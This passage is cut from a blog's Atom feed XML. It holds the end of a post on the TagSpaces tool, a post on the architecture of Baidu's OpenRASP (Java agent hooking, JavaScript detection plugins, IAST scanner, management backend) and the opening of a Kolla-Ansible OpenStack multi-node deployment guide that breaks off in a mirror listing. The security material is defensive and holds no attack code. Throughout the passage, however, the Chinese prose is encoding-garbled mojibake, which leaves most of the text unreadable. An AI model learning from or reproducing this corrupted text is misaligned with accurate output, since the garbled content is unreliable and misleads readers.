ä¸äº†å¤šå¤§ç©ºé—´ï¼Œæ‰€ä»¥è¿™æ ·å°±å¥½äº†ï¼</p><p><img src="https://i.loli.net/2021/09/09/qwxXlvUAaBdjfui.png" style="zoom:80%;" /><br /></p><p>è¿™ä¸ªå·¥å…·è¿˜æœ‰è®¸å¤šå…¶ä»–åŠŸèƒ½ï¼Œæˆ‘åªæ˜¯ç”¨äº†å…¶ä¸­çš„æ ‡ç­¾åŠŸèƒ½è€Œå·²ï¼Œæ›´å¤šçš„å°±çœ‹ <a href="https://docs.tagspaces.org/">æ–‡æ¡£</a> å‘æ˜å§~</p>]]></content>
    
    
    <summary type="html">ç»™æ–‡ä»¶å’Œæ–‡ä»¶å¤¹æ‰“æ ‡ç­¾è¿›è¡Œç®¡ç†</summary>
    
    
    
    <category term="Other" scheme="https://jckling.github.io/categories/Other/"/>
    
    
    <category term="Windows" scheme="https://jckling.github.io/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>ç™¾åº¦ OpenRASP ç»„æˆåˆ†æ</title>
    <link href="https://jckling.github.io/2021/09/08/Security/%E7%99%BE%E5%BA%A6%20OpenRASP%20%E6%9E%B6%E6%9E%84%E5%88%86%E6%9E%90/"/>
    <id>https://jckling.github.io/2021/09/08/Security/%E7%99%BE%E5%BA%A6%20OpenRASP%20%E6%9E%B6%E6%9E%84%E5%88%86%E6%9E%90/</id>
    <published>2021-09-08T07:17:39.000Z</published>
    <updated>2022-03-08T09:03:12.294Z</updated>
    
    <content type="html"><![CDATA[<h1 id="RASP-æ¶æ„"><a href="#RASP-æ¶æ„" class="headerlink" title="RASP æ¶æ„"></a>RASP æ¶æ„</h1><p>RASP å°† agent åµŒå…¥åº”ç”¨ï¼Œé€šè¿‡ hook æŠ€æœ¯æ¤å…¥æ¢é’ˆï¼Œåœ¨å…³é”®ç‚¹è§¦å‘æ£€æµ‹ï¼Œæ‹¦æˆª/æ”¾è¡Œ</p><img src="http://blog.nsfocus.net/wp-content/uploads/2018/01/7195ace984937ccbddc171ece82e237e.png" style="zoom:80%;" /><p>Java åº”ç”¨çš„æ¢é’ˆæ¤å…¥æ–¹æ³•</p><ul><li>Servlet Filterï¼šåœ¨è¯·æ±‚å“åº”è·¯å¾„ä¸Šç›‘æµ‹ï¼Œåªèƒ½å¯¹ http æŠ¥æ–‡è¿‡æ»¤å¤„ç†</li><li>JVM é‡æ„ï¼šæ¤å…¥ JVM å†…éƒ¨, åŸºäº JVM çš„å®‰å…¨æ§åˆ¶å±‚å®ç° RASP å®¹å™¨<ul><li>éœ€è¦å¯¹ JVM éå¸¸ç†Ÿæ‚‰ï¼Œéš¾åº¦å¾ˆå¤§ï¼Œå›½å¤– <a href="https://www.waratek.com/runtime-application-self-protection-rasp/">waratek</a> é‡‡ç”¨è¿™ç§æ–¹æ³•</li></ul></li><li>Java Instrumentï¼šæ™®éï¼ŒOpenRASP ä½¿ç”¨è¯¥æ–¹æ³•</li></ul><img src="http://blog.nsfocus.net/wp-content/uploads/2018/01/fca02f0c30846c349a6f3f35998724dd.png" style="zoom:80%"><h1 id="OpenRASP-ç»„æˆéƒ¨åˆ†"><a href="#OpenRASP-ç»„æˆéƒ¨åˆ†" class="headerlink" title="OpenRASP ç»„æˆéƒ¨åˆ†"></a>OpenRASP ç»„æˆéƒ¨åˆ†</h1><ul><li>Java Agent</li><li>JavaScript æ’ä»¶</li><li>Agent ç®¡ç†åå°ï¼ˆVue + Golang å®ç°ï¼‰<ul><li>ElasticSearch + MongoDB</li></ul></li><li>IAST æ‰«æå™¨ï¼ˆPython å®ç°ï¼‰</li></ul><h2 id="Java-Agent"><a href="#Java-Agent" class="headerlink" title="Java Agent"></a>Java Agent</h2><p>å¯åŠ¨æœåŠ¡æ—¶ä½¿ç”¨ <code>-javaagent</code> å‚æ•°æŒ‡å®š Java Agentï¼ŒåŠ¨æ€ä¿®æ”¹ Java å­—èŠ‚ç ï¼ˆå³ hook æ’æ¡©ï¼‰</p><ul><li>æ”»å‡»è§¦å‘æ’æ¡©ç‚¹ï¼ŒJava Agent è·å–åˆ°å‡½æ•°çš„å‚æ•°</li></ul><h3 id="å¯åŠ¨æµç¨‹"><a href="#å¯åŠ¨æµç¨‹" class="headerlink" title="å¯åŠ¨æµç¨‹"></a>å¯åŠ¨æµç¨‹</h3><ol><li>å¯åŠ¨æ—¶é¦–å…ˆä¼šè¿›å…¥ <code>javaagent</code> çš„ premain å‡½æ•°ï¼Œè¯¥å‡½æ•°ä¼šåœ¨ main å‡½æ•°ä¹‹å‰é¢„å…ˆæ‰§è¡Œ</li><li>å½“å» hook åƒ java.io.File è¿™æ ·ç”± <code>BootstrapClassLoader</code> åŠ è½½çš„ç±»çš„æ—¶å€™ï¼Œæ— æ³•ä»è¯¥ç±»è°ƒç”¨é <code>BootstrapClassLoader</code> åŠ è½½çš„ç±»ä¸­çš„æ¥å£ï¼Œæ‰€ä»¥ agent.jar ä¼šå…ˆå°†è‡ªå·±æ·»åŠ åˆ° <code>BootstrapClassLoader</code> çš„ ClassPath ä¸‹ï¼Œè¿™æ · hook ç”± <code>BootstrapClassLoader</code> åŠ è½½çš„ç±»çš„æ—¶å€™å°±èƒ½å¤ŸæˆåŠŸè°ƒç”¨åˆ° agent.jar ä¸­çš„æ£€æµ‹å…¥å£</li><li>é‡Šæ”¾ <code>log4j</code> æ—¥å¿—é…ç½®æ–‡ä»¶ï¼Œå¦‚æœå­˜åœ¨åˆ™è·³è¿‡</li><li>æ ¹æ® <code>openrasp.yml</code> æ–‡ä»¶åˆå§‹åŒ–ç›¸åº”é…ç½®é¡¹</li><li>åˆå§‹åŒ– JS æ’ä»¶æ¨¡å—<ul><li>JS ä¸Šä¸‹æ–‡ç±»åˆå§‹åŒ–</li><li>æ’ä»¶æ–‡ä»¶åˆå§‹åŒ–</li></ul></li><li>åˆå§‹åŒ–å­—èŠ‚ç è½¬æ¢æ¨¡å—<ul><li>ç»™ load class æ“ä½œè¿›è¡Œæ’æ¡©æ“ä½œï¼Œå½“ç±»åŠ è½½çš„æ—¶å€™ä¼šå…ˆè¿›å…¥ agent è¿›è¡Œå¤„ç†</li><li>å¯¹äºåœ¨åˆå§‹åŒ–å‰å·²åŠ è½½çš„ç±»æ‰§è¡Œ <code>retransform</code> å¤„ç†ï¼Œe.g <code>FileInputStream</code></li></ul></li><li>è¾“å‡ºå¯åŠ¨æˆåŠŸæ—¥å¿—ï¼Œå¼€å¯å…¨å±€ Hook å¼€å…³ï¼ˆå¯åŠ¨é˜¶æ®µä¸ºå…³é—­çŠ¶æ€ï¼‰<ul><li>è‹¥å¯åŠ¨è¿‡ç¨‹ä¸­å‘ç”Ÿé”™è¯¯ï¼Œè®°å½•é”™è¯¯æ—¥å¿—</li></ul></li><li>ç»™ openrasp.yml é…ç½®æ–‡ä»¶å’Œ js æ’ä»¶ç›®å½•ä»¥åŠ assets ç›®å½•å¢åŠ æ–‡ä»¶ç›‘æ§ï¼Œä»¥ä¾¿æ–‡ä»¶å†…å®¹æ›´æ”¹çš„æ—¶å€™ä¸éœ€è¦é‡å¯å°±èƒ½å¤Ÿå®æ—¶ç”Ÿæ•ˆ</li></ol><h3 id="hook-class-æµç¨‹"><a href="#hook-class-æµç¨‹" class="headerlink" title="hook class æµç¨‹"></a>hook class æµç¨‹</h3><ol><li>å› ä¸ºå¯åŠ¨æ—¶å€™è¿›è¡Œäº†æ’æ¡©æ“ä½œï¼ˆ<code>premain</code>ï¼‰ï¼Œå½“æœ‰ç±»è¢« ClassLoader åŠ è½½æ—¶å€™ï¼Œæ‰€ä»¥ä¼šæŠŠè¯¥ç±»çš„å­—èŠ‚ç å…ˆäº¤ç»™è‡ªå®šä¹‰çš„ Transformer å¤„ç†</li><li><strong>è‡ªå®šä¹‰ Transformer ä¼šåˆ¤æ–­è¯¥ç±»æ˜¯å¦ä¸ºéœ€è¦ hook çš„ç±»</strong>ï¼Œå¦‚æœæ˜¯ä¼šå°†è¯¥ç±»äº¤ç»™ javassist å­—èŠ‚ç å¤„ç†æ¡†æ¶è¿›è¡Œå¤„ç†</li><li>javassist æ¡†æ¶ä¼šå°†ç±»çš„å­—èŠ‚ç ä¾ç…§äº‹ä»¶é©±åŠ¨æ¨¡å‹é€æ­¥è§£ææ¯ä¸ªæ–¹æ³•ï¼Œå½“è§¦å‘éœ€è¦ hook çš„æ–¹æ³•æ—¶ï¼Œä¼šåœ¨æ–¹æ³•çš„å¼€å¤´æˆ–è€…ç»“å°¾æ’å…¥è¿›å…¥æ£€æµ‹å‡½æ•°çš„å­—èŠ‚ç </li><li>æŠŠ hook å¥½çš„å­—èŠ‚ç è¿”å›ç»™ transformer ä»è€Œè½½å…¥è™šæ‹Ÿæœº</li></ol><img src="https://rasp.baidu.com/doc/hacking/architect/images/startup.png" style="zoom:80%"><h3 id="è¯·æ±‚å¤„ç†æµç¨‹"><a href="#è¯·æ±‚å¤„ç†æµç¨‹" class="headerlink" title="è¯·æ±‚å¤„ç†æµç¨‹"></a>è¯·æ±‚å¤„ç†æµç¨‹</h3><p>ä»¥ <code>tomcat + JDBC + MySQL</code> ä¸ºä¾‹</p><ol><li>æœåŠ¡å™¨æ”¶åˆ°ä¸€ä¸ªè¯·æ±‚ï¼Œä»è€Œè¿›å…¥äº†æœåŠ¡å™¨çš„è¯·æ±‚ hook ç‚¹ï¼Œè¯¥ hook ç‚¹æ ‡æ³¨å½“å‰çº¿ç¨‹ä¸ºè¯·æ±‚çº¿ç¨‹ï¼Œå¼€å¯å½“å‰çº¿ç¨‹çš„æ£€æµ‹å¼€å…³å¹¶æŠŠè¯·æ±‚å¯¹è±¡å’Œå“åº”å¯¹è±¡è¿›è¡Œç¼“å­˜ï¼Œä»¥ä¾¿åé¢ä½¿ç”¨</li><li>æœåŠ¡å™¨å‘èµ· SQL æŸ¥è¯¢</li><li>è¿›å…¥ SQLStatementHook ç‚¹ï¼Œæˆ‘ä»¬æŒ‚é’©äº† executeã€executeUpdateã€executeQuery ç­‰æ–¹æ³•ï¼Œä»è¯¥æ–¹æ³•è¿›å…¥æ£€æµ‹æµç¨‹å¦‚ä¸‹ï¼š<ul><li>åˆ¤æ–­å½“å‰çº¿ç¨‹æ˜¯å¦ä¸ºè¯·æ±‚çº¿ç¨‹ï¼ˆç¬¬ä¸€æ­¥æ ‡è®°çš„ï¼‰ï¼Œå¦‚æœæ˜¯ç»§ç»­ä¸‹é¢æ£€æµ‹</li><li>é‡‡é›† <code>connection_idï¼ˆè¿™ä¸ªå­—æ®µä»…JDBCæ”¯æŒï¼‰</code>ã€<code>SQL è¯­å¥</code> ä»¥åŠ <code>æ•°æ®åº“ç±»å‹</code> ç­‰ä¿¡æ¯</li><li>æ„å»ºå‚æ•°ä¿¡æ¯ï¼Œè°ƒç”¨<strong>æœ¬åœ°æ’ä»¶ï¼ˆJavaï¼‰å’Œ JS æ’ä»¶</strong>è¿›è¡Œå®‰å…¨æ£€æµ‹<ul><li>è¿˜æœ‰<strong>åŸºçº¿æ£€æµ‹</strong></li></ul></li><li>æ ¹æ®æ’ä»¶çš„æ‰§è¡Œç»“æœå†³å®šæ˜¯æ‹¦æˆªè¯·æ±‚ã€æ”¾è¡Œè¿˜æ˜¯ä»…æ‰“å°æ—¥å¿—</li></ul></li><li>è¿›å…¥ SQLResultSetHook ç‚¹ï¼Œæˆ‘ä»¬æŒ‚é’©äº† resultSet.next æ–¹æ³•<ul><li>è°ƒç”¨æœ¬åœ°æ’ä»¶æ£€æŸ¥æ˜¯å¦å‘ç”Ÿæ‹–åº“è¡Œä¸ºï¼Œé»˜è®¤ç­–ç•¥ä¸ºä¸€æ¬¡æŸ¥è¯¢ç»“æœè¶…è¿‡ 500 æ¡å°±æŠ¥è­¦</li></ul></li><li>è‹¥å†³å®šæ‹¦æˆªæ”»å‡»<ul><li>è¾“å‡ºæŠ¥è­¦æ—¥å¿—åˆ° logs/alarm.log</li><li>å¦‚æœ header è¿˜æ²¡æœ‰å‘å‡ºï¼Œé»˜è®¤ä½¿ç”¨ 302 è·³è½¬åˆ°æ‹¦æˆªé¡µé¢</li><li>å¦‚æœ body è¿˜æ²¡æœ‰å‘å‡ºï¼Œåˆ™é‡ç½®æœªå‘é€çš„ body</li><li>è¾“å‡ºè‡ªå®šä¹‰æ‹¦æˆªé¡µé¢è·³è½¬ js è„šæœ¬<ul><li><code>&lt;/script&gt;&lt;script&gt;location.href=&#39;.../?request_id=xxx&#39;&lt;/script&gt;</code></li></ul></li></ul></li></ol><h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><ul><li><code>-javaagent</code> å¯åŠ¨æœåŠ¡æ—¶åŠ è½½ Agentï¼Œåœ¨ <code>premain</code> å‡½æ•°ä¸­å®šä¹‰æ’æ¡©é€»è¾‘ï¼Œå®ç°æ’æ¡©<ul><li>é¢„å®šä¹‰çš„ hook ç‚¹ï¼š<a href="https://rasp.baidu.com/doc/hacking/architect/hook.html">Hook å‡½æ•°åˆ—è¡¨</a></li><li>å¯æ–°å¢ hook ç‚¹</li></ul></li><li>æ”¶åˆ°è¯·æ±‚åï¼Œè§¦å‘æ’æ¡©ç‚¹æ”¶é›†å‡½æ•°è°ƒç”¨å‚æ•°ä¿¡æ¯ï¼Œè°ƒç”¨æ’ä»¶æ£€æµ‹</li><li>æ’ä»¶æ£€æµ‹å¹¶è¿”å›ç»“æœï¼Œæ ¹æ®ç­–ç•¥æ‰§è¡Œç›¸åº”æ“ä½œ</li></ul><h2 id="JavaScript-æ’ä»¶"><a href="#JavaScript-æ’ä»¶" class="headerlink" title="JavaScript æ’ä»¶"></a>JavaScript æ’ä»¶</h2><p>Rhino å¼•æ“æ”¯æŒå°† Java ä¸­çš„å¯¹è±¡æ³¨å†Œåˆ° JavaScript ç¯å¢ƒï¼Œå¹¶è¢« JavaScript ä»£ç è°ƒç”¨ï¼ˆæ•°æ®å…±äº«ï¼‰</p><ul><li><a href="https://github.com/mozilla/rhino">mozilla/rhino</a></li><li>JS æ’ä»¶æä¾›çƒ­æ›´æ–°åŠŸèƒ½ï¼Œå³<strong>èƒ½å¤Ÿå®æ—¶æ›´æ–°æ£€æµ‹é€»è¾‘</strong></li><li>æ ¹æ® Java Agent è¿”å›çš„æ’æ¡©ç‚¹ä¿¡æ¯ï¼Œæ‰§è¡Œæ£€æµ‹ç®—æ³•ï¼Œæœ€åè¿›è¡Œ<strong>å‘Šè­¦/æ‹¦æˆª</strong></li></ul><img src="https://rasp.baidu.com/doc/hacking/architect/images/js.png" style="zoom:80%"><p>æ£€æµ‹æ’ä»¶é’ˆå¯¹åº”ç”¨çš„è¡Œä¸ºè¿›è¡Œæ£€æµ‹ï¼Œå½“åº”ç”¨æ‰§è¡Œæ“ä½œæ—¶ï¼ˆè§¦å‘æ£€æµ‹ç‚¹ï¼‰ï¼ŒOpenRASP å¼•æ“å°±ä¼šè°ƒç”¨æ£€æµ‹æ’ä»¶ï¼Œå¹¶å°†ç›¸å…³å‚æ•°ä¸€å¹¶ä¼ é€’è¿‡æ¥ã€‚</p><p>å®˜æ–¹æä¾› 14 ä¸ªæ£€æµ‹ç‚¹ï¼š</p><ul><li>æ•°æ®åº“æŸ¥è¯¢</li><li>è¯»å–ç›®å½•</li><li>è¯·æ±‚å‚æ•°</li><li>è¯»å–æ–‡ä»¶</li><li>å†™å…¥æ–‡ä»¶</li><li>åˆ é™¤æ–‡ä»¶</li><li>æ–‡ä»¶åŒ…å«æ“ä½œ</li><li>WebDAV æ“ä½œ</li><li>æ–‡ä»¶ä¸Šä¼ </li><li>æ–‡ä»¶é‡å‘½å</li><li>å‘½ä»¤æ‰§è¡Œ</li><li>XML å¤–éƒ¨å®ä½“å¼•ç”¨</li><li>Struts OGNL è¡¨è¾¾å¼è§£æ</li><li>RMI ååºåˆ—åŒ–</li><li>æœåŠ¡å™¨ç«¯ HTTP è¯·æ±‚</li><li>æœåŠ¡å™¨ç«¯ HTTP è¯·æ±‚ - é‡å®šå‘ä¹‹å</li><li>ä»£ç æ‰§è¡Œ</li><li>ç±»åº“åŠ è½½</li><li>å“åº”æ£€æŸ¥</li></ul><h2 id="IAST-æ‰«æå™¨"><a href="#IAST-æ‰«æå™¨" class="headerlink" title="IAST æ‰«æå™¨"></a>IAST æ‰«æå™¨</h2><p>è¢«åŠ¨æ‰«ææ¨¡å¼ï¼šå¯åŠ¨æ‰«æåä¿æŒè¿è¡Œï¼Œå¯¹æ–° url è¿›è¡Œå®æ—¶æ‰«æ</p><ul><li>Python3 å®ç°ï¼ŒMySQL æ•°æ®åº“ï¼ŒHTTP + JSON é€šè®¯</li><li>å±äºä¸»åŠ¨ IASTï¼Œé‡æ”¾ payload<ul><li>è¢«åŠ¨ IAST ä½¿ç”¨æ±¡ç‚¹è¿½è¸ªå®ç°</li><li>ç¼ºç‚¹ï¼šè„æ•°æ®</li></ul></li></ul><p><strong>Agent ç«¯</strong></p><p>ç”¨äºæ”¶é›† Web åº”ç”¨çš„è¿è¡Œä¿¡æ¯ï¼Œå³ OpenRASP Java Agent + Java Application</p><p><strong>æ‰«æå™¨ç«¯</strong></p><p>ç”¨äºå¤„ç† OpenRASP æ’ä»¶äº§ç”Ÿçš„è¯·æ±‚ä¿¡æ¯ï¼Œå¹¶å®Œæˆæ•´ä¸ª IAST æ‰«æé€»è¾‘</p><ul><li>é¢„å¤„ç†æ¨¡å—ï¼ˆHTTPServerï¼‰ï¼šæ¥æ”¶ agent æ’ä»¶çš„ http è¯·æ±‚ï¼Œå¤„ç†ã€å­˜å‚¨ã€åˆ†å‘ http è¯·æ±‚ä¿¡æ¯</li><li>æ‰«ææ¨¡å—ï¼ˆScannerï¼‰ï¼šè¿è¡Œæ‰«ææ’ä»¶ï¼Œæ‰§è¡Œæ¼æ´æ‰«æé€»è¾‘<ul><li>ç”Ÿæˆæ‰«æè¯·æ±‚ï¼Œå‘é€ç»™ web server å¤„ç†å¹¶è¿”å›ç»“æœï¼ˆä»¥åŠ hook ä¿¡æ¯ï¼‰ï¼Œæ£€éªŒç»“æœ</li></ul></li><li>ç›‘æ§æ¨¡å—ï¼ˆMonitorï¼‰ï¼šå®šæœŸè·å–å…¶ä»–æ¨¡å—çš„è¿è¡Œæ—¶ä¿¡æ¯ï¼Œè°ƒæ•´å‚æ•°ï¼Œæä¾›æ§åˆ¶å°æœåŠ¡ç­‰</li></ul><img src="https://rasp.baidu.com/doc/hacking/architect/images/iast-main.png" style="zoom:80%"><p><a href="https://github.com/baidu-security/openrasp-iast">openrasp_iast</a> æºç ä¸­åŒ…å«ä¸‰ç§ç±»å‹çš„æ’ä»¶</p><ul><li>æ‰«ææ’ä»¶ï¼šplugin/scannerï¼Œç”Ÿæˆæµ‹è¯•å‘é‡ï¼Œæ£€æµ‹æµ‹è¯•ç»“æœ</li><li>å»é‡æ’ä»¶ï¼šplugin/deduplicateï¼Œé¿å…åŒä¸€ä¸ªè¯·æ±‚è¢«åå¤æ‰«æ</li><li>è®¤è¯æ’ä»¶ï¼šplugin/authorizer</li></ul><p>æ‰§è¡Œæµç¨‹</p><ol><li>ç­‰å¾…ç”¨æˆ·å‘é€è¯·æ±‚</li><li>Agent ç«¯å°† hook ä¿¡æ¯å‘é€ç»™æ‰«æå™¨ç«¯</li><li>æ‰«æå™¨ç«¯æ„å»º payload é‡æ”¾</li><li>Agent ç«¯å°† hook ä¿¡æ¯å‘é€ç»™æ‰«æå™¨ç«¯ï¼Œæ‰«æå™¨ç«¯æ”¶åˆ°å“åº”</li></ol><p>RASP + IAST</p><ul><li>RASP å®‰è£… IAST æ’ä»¶ï¼šopenrasp/plugins/iast/plugin.jsï¼ˆçƒ­æ›´æ–°ï¼‰<ul><li>æ³¨å†Œ hook ç‚¹ï¼Œè§¦å‘æ£€æµ‹é€»è¾‘</li></ul></li><li>IAST æ‰«æå™¨ç»“åˆæ’ä»¶ä½¿ç”¨<ul><li>hook ä¿¡æ¯ã€å“åº”ä¿¡æ¯</li></ul></li></ul><h2 id="ç®¡ç†åå°"><a href="#ç®¡ç†åå°" class="headerlink" title="ç®¡ç†åå°"></a>ç®¡ç†åå°</h2><p>ç®¡ç† Agentã€æŸ¥è¯¢æ—¥å¿—</p><img src="https://rasp.baidu.com/doc/hacking/architect/images/rasp-cloud.png" style="zoom:80%"><h1 id="æ€»ç»“-1"><a href="#æ€»ç»“-1" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><ol><li>hook ç‚¹é¢„å…ˆå®šä¹‰ï¼Œè§¦å‘åè°ƒç”¨ JS æ’ä»¶æ£€æµ‹</li><li>æ‰«æå™¨æ¥æ”¶è¯·æ±‚åŠå…¶ hook ä¿¡æ¯ï¼Œæ„é€ æ–°çš„è¯·æ±‚ï¼Œæ ¹æ®æ‰§è¡Œç»“æœå’Œ hook ä¿¡æ¯å®ç°æ£€æµ‹</li></ol><h1 id="å‚é˜…"><a href="#å‚é˜…" class="headerlink" title="å‚é˜…"></a>å‚é˜…</h1><ul><li><a href="http://blog.nsfocus.net/rasp-tech/">RASPæŠ€æœ¯åˆ†æ</a></li><li><a href="https://rasp.baidu.com/doc/">OpenRASP å®˜æ–¹æ–‡æ¡£</a></li></ul>]]></content>
    
    
    <summary type="html">æ¢³ç† OpenRASP çš„å„ä¸ªç»„æˆéƒ¨åˆ†ï¼šJava Agent æ’æ¡©ã€JS æ’ä»¶æ£€æµ‹ã€ç®¡ç†åå°ã€IAST æ‰«æå™¨ã€‚</summary>
    
    
    
    <category term="Security" scheme="https://jckling.github.io/categories/Security/"/>
    
    
    <category term="Python" scheme="https://jckling.github.io/tags/Python/"/>
    
    <category term="Java" scheme="https://jckling.github.io/tags/Java/"/>
    
    <category term="Golang" scheme="https://jckling.github.io/tags/Golang/"/>
    
  </entry>
  
  <entry>
    <title>Kolla-Ansible å¤šæœºéƒ¨ç½² V ç‰ˆ OpenStack</title>
    <link href="https://jckling.github.io/2021/08/31/OpenStack/Kolla-Ansible%20%E5%A4%9A%E6%9C%BA%E9%83%A8%E7%BD%B2/"/>
    <id>https://jckling.github.io/2021/08/31/OpenStack/Kolla-Ansible%20%E5%A4%9A%E6%9C%BA%E9%83%A8%E7%BD%B2/</id>
    <published>2021-08-31T01:49:26.000Z</published>
    <updated>2022-03-08T09:03:12.286Z</updated>
    
    <content type="html"><![CDATA[<h1 id="æµ‹è¯•ç¯å¢ƒæ­å»º"><a href="#æµ‹è¯•ç¯å¢ƒæ­å»º" class="headerlink" title="æµ‹è¯•ç¯å¢ƒæ­å»º"></a>æµ‹è¯•ç¯å¢ƒæ­å»º</h1><p>ä¹‹å‰æŠŠæœ¬åœ°é•œåƒä»“åº“ã€OpenStackã€Jaeger å…¨éƒ½æ”¾åœ¨äº†ä¸€å°ä¸»æœºä¸Šè·‘ï¼Œè´Ÿè½½å¾ˆå¤§ï¼Œè€Œä¸”ä¹Ÿä¸ä¿é™©ã€‚ç°åœ¨æ‹†åˆ†ä¸º 2 å°ä¸»æœºï¼š</p><ol><li>éƒ¨ç½²èŠ‚ç‚¹ï¼ˆKolla-Ansibleï¼‰<ul><li>Ubuntu 20.04</li><li>4 CPU </li><li>å†…å­˜ 16 GB</li><li>ç¡¬ç›˜ 500 GB</li><li>ç½‘å¡1</li></ul></li><li>æ§åˆ¶èŠ‚ç‚¹ï¼ˆOpenStackï¼‰<ul><li>Ubuntu 20.04</li><li>4 CPU </li><li>å†…å­˜ 16 GB</li><li>ç¡¬ç›˜ 500 GB</li><li>ç½‘å¡1</li><li>ç½‘å¡2ï¼ˆæœªå¯ç”¨ï¼‰</li></ul></li></ol><p>åœ¨éƒ¨ç½²èŠ‚ç‚¹ç”¨ multinode é…ç½®è¿œç¨‹éƒ¨ç½² OpenStackï¼Œè™½ç„¶è¿™é‡Œåªæœ‰ä¸€å° OpenStack ä¸»æœºğŸ˜‚</p><h1 id="æ§åˆ¶èŠ‚ç‚¹"><a href="#æ§åˆ¶èŠ‚ç‚¹" class="headerlink" title="æ§åˆ¶èŠ‚ç‚¹"></a>æ§åˆ¶èŠ‚ç‚¹</h1><p>æ§åˆ¶èŠ‚ç‚¹åªéœ€ç»™ç”¨æˆ·é…ç½® sudo æƒé™</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æ·»åŠ ç”¨æˆ·</span></span><br><span class="line">sudo vim /etc/sudoers</span><br><span class="line"><span class="comment">##includedir /etc/sudoers.d</span></span><br><span class="line"><span class="comment">#op1 ALL=(ALL) NOPASSWD: ALL</span></span><br></pre></td></tr></table></figure><blockquote><p>Prior to Queens, when users want to connect using non-root user, they must add extra option <code>ansible_become=True</code> which is inconvenient and add security risk. In Queens, almost all services have support for escalation for only necessary tasks. In Rocky, all services have this capability, so users do not need to add <code>ansible_become</code> option if connection user has passwordless sudo capability.</p></blockquote><h1 id="éƒ¨ç½²èŠ‚ç‚¹"><a href="#éƒ¨ç½²èŠ‚ç‚¹" class="headerlink" title="éƒ¨ç½²èŠ‚ç‚¹"></a>éƒ¨ç½²èŠ‚ç‚¹</h1><h2 id="ç¯å¢ƒå‡†å¤‡"><a href="#ç¯å¢ƒå‡†å¤‡" class="headerlink" title="ç¯å¢ƒå‡†å¤‡"></a>ç¯å¢ƒå‡†å¤‡</h2><ol><li><p>é…ç½® Python3</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># è®¾ä¸ºé»˜è®¤</span></span><br><span class="line">sudo update-alternatives --install /usr/bin/python python /usr/bin/python3.8 1</span><br><span class="line"><span class="comment">#sudo update-alternatives --remove python /usr/bin/python3.8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å®‰è£… pip</span></span><br><span class="line">sudo apt install -y python3-pip</span><br></pre></td></tr></table></figure></li><li><p>æ›´æ¢ pip æº</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># åˆ›å»ºæ–‡ä»¶å¤¹</span></span><br><span class="line">mkdir .pip &amp;&amp; <span class="built_in">cd</span> .pip</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ›å»ºå¹¶ç¼–è¾‘é…ç½®æ–‡ä»¶</span></span><br><span class="line">sudo vim pip.conf</span><br></pre></td></tr></table></figure><p> é…ç½®å¦‚ä¸‹</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[global]</span><br><span class="line">timeout &#x3D; 6000</span><br><span class="line">index-url &#x3D; http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;pypi&#x2F;simple&#x2F;</span><br><span class="line">trusted-host &#x3D; mirrors.aliyun.com</span><br></pre></td></tr></table></figure></li><li><p>æ›´æ¢ Ubuntu æº</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å¤‡ä»½</span></span><br><span class="line">sudo mv /etc/apt/sources.list /etc/apt/sources.list.bk</span><br><span class="line"></span><br><span class="line"><span class="comment"># è®¾ç½®é•œåƒæº</span></span><br><span class="line">sudo vim /etc/apt/sources.list</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ›´æ–°æº</span></span><br><span class="line">sudo apt update</span><br><span class="line"></span><br><span class="line"><span class="comment"># å‡çº§</span></span><br><span class="line">sudo apt dist-upgrade -y</span><br><span class="line"></span><br><span class="line"><span class="comment"># é‡å¯</span></span><br><span class="line">sudo reboot</span><br></pre></td></tr></table></figure><p> é•œåƒæºé…ç½®å¦‚ä¸‹ï¼š</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># é»˜è®¤æ³¨é‡Šäº†æºç é•œåƒä»¥æé«˜ apt update é€Ÿåº¦ï¼Œå¦‚æœ‰éœ€è¦å¯è‡ªè¡Œå–æ¶ˆæ³¨é‡Š</span></span><br><span class="line">deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal main restricted universe multiverse</span><br><span class="line"><span class="comment"># deb-src http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal main restricted universe multiverse</span></span><br><span class="line">deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-updates main restricted universe multiverse</span><br><span class="line"><span class="comment"># deb-src http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-updates main restricted universe multiverse</span></span><br><span class="line">deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-backports main restricted universe multiverse</span><br><span class="line"><span class="comment"># deb-src http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-backports main restricted universe multiverse</span></span><br><span class="line">deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-security main restricted universe multiverse</span><br><span class="line"><span class="comment"># deb-src 